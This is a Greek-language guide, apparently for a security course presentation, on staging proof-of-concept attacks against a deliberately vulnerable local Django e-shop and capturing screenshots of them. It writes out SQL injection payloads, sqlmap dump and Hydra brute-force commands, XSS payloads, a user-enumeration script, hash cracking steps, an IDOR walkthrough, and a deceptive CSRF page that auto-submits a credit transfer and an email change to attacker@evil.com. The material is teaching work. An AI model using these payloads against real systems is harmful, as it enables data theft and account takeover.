# Οδηγίες για Screenshots και Proof of Concept

## Προετοιμασία Περιβάλλοντος

### 1. Εγκατάσταση Εργαλείων

```bash
# Burp Suite Community Edition
# Download από: https://portswigger.net/burp/communitydownload

# SQLMap
pip install sqlmap

# Hydra
sudo apt-get install hydra  # Linux
brew install hydra          # macOS

# OWASP ZAP
# Download από: https://www.zaproxy.org/download/
```

### 2. Δημιουργία Test Users

```python
# Εκτελέστε στο Django shell
python manage.py shell

from django.contrib.auth.models import User
from eshop.models import Order, Product, ShippingAddress

# Δημιουργία χρηστών
user1 = User.objects.create_user('victim1', 'victim1@example.com', 'password123')
user2 = User.objects.create_user('victim2', 'victim2@example.com', 'password123')
admin = User.objects.create_superuser('admin', 'admin@example.com', 'admin123')

# Δημιουργία παραγγελιών για IDOR demo
from eshop.models import Order, ShippingAddress

# Shipping address για victim1
addr1 = ShippingAddress.objects.create(
    user=user1,
    name="Γιώργος Παπαδόπουλος",
    address="Ερμού 15",
    city="Αθήνα",
    zip_code="10563",
    country="Ελλάδα",
    phone="2101234567",
    email="victim1@example.com"
)

# Παραγγελία για victim1
order1 = Order.objects.create(
    id="ORD-DEMO1-TEST1",
    user=user1,
    shipping_address=addr1,
    total_amount=150.00,
    status='pending'
)

# Παρόμοια για victim2
```

---

## Λεπτομερείς Οδηγίες ανά Screenshot

### Screenshot 1: Αρχιτεκτονική Εφαρμογής

**Εργαλείο**: draw.io (https://app.diagrams.net/)

**Βήματα**:
1. Δημιουργήστε νέο διάγραμμα
2. Προσθέστε 3 layers:
   - **Presentation Layer**: Browser, HTML/CSS/JS
   - **Application Layer**: Django Server, Views, Forms
   - **Data Layer**: SQLite Database
3. Προσθέστε κόκκινα βέλη που δείχνουν τα σημεία ευπαθειών
4. Export ως PNG με όνομα: `architecture_vulnerabilities.png`

### Screenshot 2: SQL Injection - Database Extraction

**Μέθοδος A - Manual Browser**:
```
1. Ανοίξτε Chrome/Firefox
2. F12 για Developer Tools
3. Πηγαίνετε στο http://localhost:8000/catalog/
4. Στο search box: ' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL FROM auth_user--
5. Screenshot που δείχνει:
   - URL με το payload
   - Results με usernames/passwords
   - Developer console (προαιρετικά)
```

**Μέθοδος B - Burp Suite**:
```
1. Configure browser proxy: 127.0.0.1:8080
2. Burp Suite > Proxy > Intercept ON
3. Browse to /catalog/?q=test
4. Intercept request
5. Modify q parameter
6. Forward και screenshot του response
```

### Screenshot 3: SQLMap Automated Attack

```bash
# Terminal commands
sqlmap -u "http://localhost:8000/catalog/?q=test" \
       --batch \
       --dump \
       --threads=10

# Screenshot που περιλαμβάνει:
# - Identified injection point
# - Database fingerprinting
# - Dumped tables (auth_user, eshop_product, etc.)
```

### Screenshot 4-5: XSS Demonstration

**Reflected XSS**:
```javascript
// Payloads να δοκιμάσετε:
<script>alert('XSS by [YOUR_NAME]')</script>
<img src=x onerror="alert('XSS Vulnerability')">
<svg onload="alert(document.domain)">
```

**Stored XSS Setup**:
```
1. Login ως testuser
2. Πηγαίνετε σε product detail
3. Submit review:
   Title: Great Product!
   Content: <script>alert('Stored XSS - Review System')</script>
   Rating: 5
4. Logout και login ως άλλος χρήστης
5. Visit το ίδιο product
6. Screenshot του alert
```

### Screenshot 6-7: Authentication Attacks

**User Enumeration**:
```python
# Script για demonstration
import requests

users = ['admin', 'testuser', 'nonexistent', 'victim1']
for user in users:
    r = requests.post('http://localhost:8000/login/', 
                      data={'username': user, 'password': 'wrong'})
    print(f"{user}: {r.text[r.text.find('Error'):r.text.find('Error')+100]}")
```

**Hydra Brute Force**:
```bash
# Δημιουργήστε αρχείο users.txt
echo "admin\ntestuser\nvictim1" > users.txt

# Δημιουργήστε αρχείο passwords.txt  
echo "password123\nadmin123\ntest123\npassword" > passwords.txt

# Run Hydra
hydra -L users.txt -P passwords.txt localhost http-post-form \
      "/login/:username=^USER^&password=^PASS^:Invalid"
```

### Screenshot 8: Password Cracking

**Online Method**:
```
1. Από SQL injection πάρτε hash: md5$salt$5f4dcc3b5aa765d61d8327deb882cf99
2. Visit https://crackstation.net/
3. Paste hash
4. Screenshot του αποτελέσματος
```

**Offline Method**:
```bash
# Αν έχετε hashcat
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Screenshot 9: IDOR Exploitation

**Setup**:
```python
# Βεβαιωθείτε ότι έχετε 2+ orders από διαφορετικούς users
# Δείτε την προετοιμασία περιβάλλοντος
```

**Demonstration**:
```
1. Login ως victim1
2. Navigate: http://localhost:8000/my-orders/
3. Note your order: ORD-DEMO1-TEST1
4. Manually change URL to: http://localhost:8000/order/ORD-DEMO2-TEST2/
5. Screenshot που δείχνει:
   - Διαφορετικό username
   - Διαφορετική διεύθυνση
   - Προσωπικά δεδομένα άλλου χρήστη
```

### Screenshot 10: CSRF Attack

**Δημιουργία Attack Page**:
```html
<!-- Αποθηκεύστε ως csrf_demo.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Συγχαρητήρια!</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .prize-box {
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 10px;
            display: inline-block;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        button {
            background: #4CAF50;
            color: white;
            padding: 15px 30px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="prize-box">
        <h1>🎉 Κερδίσατε iPhone 15! 🎉</h1>
        <p>Κάντε κλικ για να διεκδικήσετε το δώρο σας!</p>
        <button onclick="claim()">ΔΙΕΚΔΙΚΗΣΗ ΤΩΡΑ</button>
    </div>
    
    <!-- Hidden CSRF Forms -->
    <form id="transfer" action="http://localhost:8000/transfer-credits/" method="POST" style="display:none">
        <input name="recipient" value="attacker">
        <input name="amount" value="999.99">
    </form>
    
    <form id="email" action="http://localhost:8000/update-email/" method="POST" style="display:none">
        <input name="email" value="attacker@evil.com">
    </form>
    
    <script>
        function claim() {
            alert('Επεξεργαζόμαστε το αίτημά σας...');
            document.getElementById('transfer').submit();
            setTimeout(() => {
                document.getElementById('email').submit();
            }, 1000);
        }
        
        // Auto-submit after 3 seconds
        setTimeout(claim, 3000);
    </script>
</body>
</html>
```

**Εκτέλεση**:
```
1. Login στην εφαρμογή
2. Open νέο tab
3. Drag & drop το csrf_demo.html στο browser
4. Screenshot πριν το auto-submit
5. Screenshot του success message
6. Navigate to /profile/ και screenshot των αλλαγών
```

---

## Δημιουργία Professional Screenshots

### Εργαλεία για Screenshots

1. **Windows**: 
   - Snipping Tool (Win + Shift + S)
   - ShareX (δωρεάν, με annotations)

2. **macOS**:
   - Cmd + Shift + 4 (επιλογή περιοχής)
   - Cmd + Shift + 5 (με επιλογές)

3. **Linux**:
   - Flameshot (recommended)
   - gnome-screenshot

### Best Practices

1. **Annotations**:
   - Κόκκινα βέλη για να δείξετε το vulnerability
   - Κίτρινο highlight για important data
   - Text boxes για επεξηγήσεις

2. **Censoring**:
   - Blur ευαίσθητα δεδομένα (πραγματικά emails, IPs)
   - Χρησιμοποιήστε μαύρες μπάρες για passwords

3. **Consistency**:
   - Ίδιο browser για όλα τα screenshots
   - Ίδιο theme (light/dark)
   - Consistent window size

---

## Checklist για την Παρουσίαση

### Πριν την Παρουσίαση

- [ ] Όλα τα screenshots saved και organized
- [ ] Backup του vulnerable app
- [ ] Test accounts created
- [ ] Exploitation scripts ready
- [ ] Burp Suite configured
- [ ] Network isolated (no real attacks)

### Demo Environment

```bash
# Start vulnerable server
cd secure_eshop
python manage.py runserver

# Terminal 2 - Attack tools
cd scripts/exploits

# Terminal 3 - Monitoring
tail -f logs/access.log
```

### Live Demo Σενάρια

#### Σενάριο 1: SQL Injection (3 λεπτά)
1. Manual injection στο search
2. SQLMap automated attack
3. Show extracted data

#### Σενάριο 2: XSS (3 λεπτά)
1. Reflected XSS alert
2. Stored XSS in reviews
3. Cookie theft demo

#### Σενάριο 3: IDOR (2 λεπτά)
1. Login as user1
2. Access user2's order
3. Show personal data exposure

#### Σενάριο 4: CSRF (2 λεπτά)
1. Show vulnerable form
2. Open attack page
3. Demonstrate automatic submission

#### Σενάριο 5: Authentication (3 λεπτά)
1. User enumeration
2. Brute force demo
3. Weak password discussion

### Backup Plans

Αν κάτι πάει στραβά στο live demo:

1. **Screenshots**: Έχετε όλα τα screenshots ready
2. **Video Recording**: Καταγράψτε τα demos πριν
3. **Offline Version**: Local copies όλων των pages

### Ερωτήσεις που να Περιμένετε

1. **"Πώς θα το διορθώναμε αυτό;"**
   - Έχετε έτοιμο τον secure code

2. **"Ποια είναι η πιο κρίσιμη ευπάθεια;"**
   - SQL Injection (πλήρης DB access)

3. **"Πόσο εύκολο είναι να εκμεταλλευτεί κάποιος αυτά;"**
   - Πολύ εύκολο με basic tools

4. **"Υπάρχουν automated λύσεις;"**
   - WAF, SAST/DAST tools, Security headers

---

## Τελικές Συμβουλές

1. **Timing**: 15 λεπτά totals
   - 2 λεπτά intro
   - 10 λεπτά demos
   - 3 λεπτά συμπεράσματα

2. **Emphasis**:
   - Business impact
   - Ease of exploitation
   - Real-world relevance

3. **Professional Approach**:
   - Ξεκινήστε με executive summary
   - Χρησιμοποιήστε τεχνικούς όρους σωστά
   - Τελειώστε με clear next steps

4. **Emergency Contacts**:
   - Save all files in USB
   - Have PDF version of report
   - Backup laptop ready